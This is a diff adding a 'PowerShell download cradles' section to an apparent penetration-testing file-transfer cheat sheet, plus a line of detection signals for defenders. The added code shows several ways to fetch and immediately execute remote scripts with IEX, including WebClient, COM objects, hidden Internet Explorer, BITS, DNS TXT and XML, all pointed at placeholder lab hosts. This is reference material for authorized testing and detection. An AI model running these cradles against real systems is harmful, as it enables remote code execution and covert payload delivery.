@@ -74,6 +74,70 @@ Older PowerShell:
 Invoke-WebRequest 'http://ATTACK_IP:8000/file.bin' -UseBasicParsing -OutFile 'C:\\Temp\\file.bin'
 ```
 
+## PowerShell download cradles
+
+These retrieve and immediately execute remote text. Use only in an authorized lab after validating the source. The safer workflow is download → inspect/hash → execute.
+
+```powershell
+# WebClient
+IEX (New-Object Net.WebClient).DownloadString('http://LAB_SERVER/script.ps1')
+
+# PowerShell 3.0+
+IEX (Invoke-WebRequest 'http://LAB_SERVER/script.ps1' -UseBasicParsing).Content
+
+# MSXML COM
+$h=New-Object -ComObject Msxml2.XMLHTTP
+$h.Open('GET','http://LAB_SERVER/script.ps1',$false)
+$h.Send()
+IEX $h.ResponseText
+
+# WinHTTP COM — uses WinHTTP proxy configuration
+$h=New-Object -ComObject WinHttp.WinHttpRequest.5.1
+$h.Open('GET','http://LAB_SERVER/script.ps1',$false)
+$h.Send()
+IEX $h.ResponseText
+```
+
+Legacy Internet Explorer COM:
+
+```powershell
+$ie=New-Object -ComObject InternetExplorer.Application
+$ie.Visible=$false
+$ie.Navigate('http://LAB_SERVER/script.ps1')
+Start-Sleep 5
+$r=$ie.Document.body.innerHTML
+$ie.Quit()
+IEX $r
+```
+
+BITS—touches disk:
+
+```powershell
+Import-Module BitsTransfer
+Start-BitsTransfer 'http://LAB_SERVER/script.ps1' "$env:TEMP\transfer.tmp"
+$r=Get-Content "$env:TEMP\transfer.tmp" -Raw
+Remove-Item "$env:TEMP\transfer.tmp"
+IEX $r
+```
+
+DNS TXT transport:
+
+```powershell
+$txt=(Resolve-DnsName -Type TXT payload.lab.example).Strings -join ''
+$code=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($txt))
+IEX $code
+```
+
+XML-hosted command:
+
+```powershell
+$xml=New-Object System.Xml.XmlDocument
+$xml.Load('https://LAB_SERVER/command.xml')
+$xml.command.a.execute | IEX
+```
+
+DNS TXT data must fit DNS limits or be chunked. Base64 is not encryption. Remote content can change, so pin, inspect, and preserve the response during an authorized test.
+
 BITS:
 
 ```powershell
@@ -440,6 +504,8 @@ Look up approved techniques by function in LOLBAS (Windows) and GTFOBins (Linux)
 | BITS | `Microsoft BITS/<version>` and often `HEAD` before `GET` |
 
 User-agent strings are client-controlled. Correlate with process creation, PowerShell/AMSI logs, DNS/proxy/firewall data, destination rarity, file writes, and execution.
+
+Download-cradle signals: `IEX` consuming network-derived content; PowerShell-created IE, MSXML, or WinHTTP COM objects; BITS download/read/delete chains; unusual DNS TXT queries followed by Base64 decoding; and remotely loaded XML nodes flowing into execution.
 
 Authorized user-agent test:
 
